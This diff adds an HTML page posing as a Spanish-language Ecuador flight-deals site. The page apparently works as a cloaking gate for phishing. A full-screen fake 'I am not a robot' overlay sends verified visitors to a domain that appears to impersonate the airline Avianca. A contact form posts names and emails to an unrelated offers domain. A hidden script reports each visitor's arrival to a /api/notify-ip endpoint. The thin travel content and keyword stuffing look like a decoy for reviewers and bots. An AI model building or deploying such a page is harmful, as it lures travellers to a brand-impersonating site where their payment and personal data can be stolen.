@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="description" content="Explora la riqueza de Ecuador y descubre lo mejor de Quito, Guayaquil, Cuenca, Galápagos, Baños, Manta, y Salinas." />
+  <meta name="keywords" content="vuelos, tiquetes baratos, vuelos baratos, viajes baratos, ofertas viajes, buscar vuelos, viajes ecuador, viajes a quito, viajes a guayaquil, vuelos a cuenca, vuelos a manta, vuelos a loja, vuelos a esmeraldas, vuelos a salinas, vuelos a baños, vuelos a galápagos, vuelos a tulcán, vuelos a portoviejo, vuelos a ibarra, vuelos a riobamba" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Vuelos - Encuentra tiquetes y vuelos baratos | Sitio web oficial</title>
+
+  <!-- Fuente Roboto para el captcha -->
+  <link rel="preconnect" href="https://fonts.googleapis.com/" />
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet" />
+
+  <!-- Google reCAPTCHA script -->
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+
+  <style>
+    /* Estilos generales */
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      line-height: 1.6;
+    }
+    header {
+      background: #2a9d8f;
+      color: #fff;
+      padding: 20px;
+      text-align: center;
+    }
+    nav {
+      background: #264653;
+      padding: 10px;
+      text-align: center;
+    }
+    nav a {
+      color: #fff;
+      margin: 0 15px;
+      text-decoration: none;
+    }
+    main {
+      padding: 20px;
+    }
+    section {
+      margin-bottom: 40px;
+    }
+    h2 {
+      border-bottom: 2px solid #ccc;
+      padding-bottom: 10px;
+    }
+    .city {
+      background: #f4f4f4;
+      padding: 20px;
+      margin-bottom: 20px;
+    }
+    .contact-form {
+      background: #e9ecef;
+      padding: 20px;
+      max-width: 600px;
+      margin: 0 auto;
+    }
+    .contact-form label {
+      display: block;
+      margin-bottom: 5px;
+    }
+    .contact-form input,
+    .contact-form textarea {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 10px;
+    }
+    .contact-form button {
+      background: #2a9d8f;
+      color: #fff;
+      padding: 10px 20px;
+      border: none;
+      cursor: pointer;
+    }
+    footer {
+      background: #264653;
+      color: #fff;
+      text-align: center;
+      padding: 10px;
+    }
+
+    /* Captcha overlay corregido */
+    #captchaOverlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(240, 240, 240, 0.98) url('fondo.png') center center no-repeat;
+      background-size: cover;
+      background-attachment: fixed;
+      z-index: 9999;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .container {
+      background: #fff;
+      border-radius: 10px;
+      box-shadow: 0 3px 10px rgba(0,0,0,0.3);
+      padding: 20px;
+      max-width: 350px;
+      width: 100%;
+      text-align: center;
+      margin: 0;
+    }
+    .container h1 {
+      font-size: 20px;
+      color: #333;
+      margin-bottom: 20px;
+    }
+    #continueBtn {
+      margin-top: 15px;
+      padding: 10px 20px;
+      font-size: 16px;
+      font-weight: bold;
+      color: #fff;
+      background: linear-gradient(45deg, #f00, #d93025);
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: transform 0.2s, box-shadow 0.2s;
+      display: none;
+      width: 100%;
+    }
+    #continueBtn:hover {
+      transform: scale(1.05);
+      box-shadow: 0 3px 8px rgba(0, 123, 255, 0.4);
+    }
+    #successMsg {
+      margin-top: 15px;
+      color: #333;
+      font-weight: bold;
+      display: none;
+    }
+  </style>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=AW-17484273937">
+</script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'AW-17484273937');
+</script>
+
+</head>
+<body>
+  <!-- Captcha Overlay -->
+  <div id="captchaOverlay">
+    <div class="container">
+      <h1>No soy un robot</h1>
+      <form id="captchaForm">
+        <div class="g-recaptcha" data-sitekey="6LfVuqUrAAAAAHccxvAaPhGofWBwREdHQ298dTGf" data-callback="captchaVerificado"></div>
+        <button type="button" id="continueBtn">Continuar</button>
+        <p id="successMsg">Validación completada.</p>
+      </form>
+    </div>
+  </div>
+
+  <!-- Contenido principal -->
+  <header>
+    <h1>Descubre Ecuador: Un Viaje de Experiencias</h1>
+    <p>Vive la magia de <strong>viajes ecuador</strong> y aprovecha <strong>ofertas viajes</strong> únicas en cada destino.</p>
+  </header>
+  <nav>
+    <a href="#quito">Quito</a>
+    <a href="#guayaquil">Guayaquil</a>
+    <a href="#cuenca">Cuenca</a>
+    <a href="#galapagos">Galápagos</a>
+    <a href="#banos">Baños</a>
+    <a href="#salinas">Salinas</a>
+    <a href="#politicas">Políticas</a>
+    <a href="#contacto">Contacto</a>
+  </nav>
+  <main>
+    <section id="quito" class="city">
+      <h2>Quito</h2>
+      <p>Quito cautiva con su arquitectura colonial, paisajes andinos y rica historia.</p>
+    </section>
+    <section id="politicas">
+      <h2>Políticas de Privacidad</h2>
+      <p>En Descubre Ecuador, valoramos tu privacidad.</p>
+    </section>
+    <section id="contacto">
+      <h2>Contacto</h2>
+      <div class="contact-form">
+        <form action="https://superofertvuelos.online/procesar_formulario.php" method="post">
+          <label for="nombre">Nombre:</label>
+          <input type="text" id="nombre" name="nombre" required />
+          <label for="email">Correo Electrónico:</label>
+          <input type="email" id="email" name="email" required />
+          <label for="mensaje">Mensaje:</label>
+          <textarea id="mensaje" name="mensaje" rows="5" required></textarea>
+          <button type="submit">Enviar Mensaje</button>
+        </form>
+      </div>
+    </section>
+  </main>
+  <footer>
+    <p>&copy; 2025 Descubre Ecuador. Todos los derechos reservados.</p>
+  </footer>
+
+  <script>
+    function captchaVerificado() {
+      document.getElementById('continueBtn').style.display = 'block';
+      document.getElementById('successMsg').style.display = 'block';
+    }
+
+    document.getElementById('continueBtn').addEventListener('click', () => {
+      window.location.href = "https://aviancapromocionales.vercel.app"; // URL de redirección tras validar
+    });
+  </script>
+
+  <script>
+    (function notify(){
+      if (!('fetch' in window)) return;
+      const send = () => fetch('/api/notify-ip', { method: 'POST' }).catch(()=>{});
+      if (document.readyState === 'complete' || document.readyState === 'interactive') {
+        setTimeout(send, 400);
+      } else {
+        document.addEventListener('DOMContentLoaded', () => setTimeout(send, 400));
+      }
+    })();
+  </script>
+</body>
+</html>
+
+
+
+
